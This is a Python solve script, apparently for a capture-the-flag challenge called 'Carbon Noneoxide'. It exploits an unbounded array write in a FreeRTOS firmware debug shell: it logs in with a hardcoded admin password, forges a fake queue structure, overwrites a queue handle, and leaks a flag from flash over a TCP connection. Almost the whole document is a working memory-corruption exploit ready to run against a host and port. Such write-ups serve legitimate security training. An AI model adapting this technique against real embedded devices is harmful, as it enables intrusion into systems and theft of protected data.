#!/usr/bin/env python3
"""
Carbon Noneoxide — flag leak exploit.

Target: FreeRTOS firmware (LM3S6965 / Cortex-M3) emulated in QEMU, UART over TCP.

Bug: the `i` (inject) debug-shell command appends a reading to a 128-entry log
array at 0x20006140 using a 1-byte counter at 0x2000613c with NO bounds check.
The sensor task clamps that counter, so we suspend it first (`s`). With the
sensor off the counter is deterministic (C = 1), so inject #128 writes exactly
onto the FreeRTOS queue handle at 0x20006340.

Exploit: build a fake Queue_t in the log array whose pcReadFrom points at the
flag in flash (0x22d8) with uxItemSize = 4 and uxMessagesWaiting > 0, then make
inject #128 repoint the Monitor's queue handle at it. The Monitor then
xQueueReceive()s straight out of flash and prints the flag 4 bytes at a time as
"CO readings"; reassemble the little-endian uint32s.

Usage: python3 solve.py <host> <port>     e.g. python3 solve.py 18.215.143.250 1337
"""
import socket, select, time, re, struct, sys

HOST, PORT = sys.argv[1], int(sys.argv[2])

LOG   = 0x20006140      # log array base
QHDL  = 0x20006340      # sensor queue handle == log index 128
QBASE = 0x20006144      # fake queue base == log index 1 (counter C = 1)
FLAG  = 0x22d8          # flag string in flash

# Fake Queue_t fields, keyed by log-array index (inject #k writes index k).
# Offsets: pcHead@0x00 pcTail@0x08 pcReadFrom@0x0C sendWait.count@0x10
#          uxMessagesWaiting@0x38 uxItemSize@0x40   (index = 1 + offset/4)
FIELDS = {
    1:  0x22d4,     # pcHead  (only used on wrap, which we avoid)
    3:  0x30000,    # pcTail  (large -> never wrap)
    4:  FLAG - 4,   # pcReadFrom (+itemSize before copy -> 0x22d8)
    5:  0,          # xTasksWaitingToSend.uxNumberOfItems -> clean, listless return
    15: 16,         # uxMessagesWaiting (plenty of reads)
    17: 4,          # uxItemSize
    128: QBASE,     # overwrite queue handle -> point Monitor at our fake queue
}
SEQ = [FIELDS.get(k, 0) for k in range(1, 129)]   # 128 injects
INJECTED = set(SEQ)                               # our own values, to filter out of the leak


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.setblocking(False)
    buf = bytearray()

    def drain(t):
        end = time.time() + t
        while time.time() < end:
            r, _, _ = select.select([s], [], [], 0.1)
            if r:
                d = s.recv(8192)
                if not d:
                    return
                buf.extend(d)

    drain(1.2)                 # banner + exactly one sensor reading (sets counter C = 1)
    s.sendall(b"charlotte\n")  # admin password
    drain(0.4)
    s.sendall(b"s\n")          # suspend sensor task -> counter frozen
    drain(0.5)
    for v in SEQ:              # 128 paced injects: build fake queue, then swap the handle
        s.sendall(b"i\n");            drain(0.03)
        s.sendall(b"%d\n" % v);       drain(0.03)
    drain(4.0)                 # Monitor now reads our fake queue == flash; collect output
    s.close()

    txt = buf.decode("latin1")
    seen = [int(x) for x in re.findall(r"Reading = (\d+)", txt)]
    leak = [v for v in seen if v not in INJECTED]           # chunks that came from flash
    raw = b"".join(struct.pack("<I", v & 0xFFFFFFFF) for v in leak)
    m = re.search(rb"rstcon\{[^}]*\}", raw)
    print("FLAG =", m.group().decode() if m else "NOT FOUND")


if __name__ == "__main__":
    main()
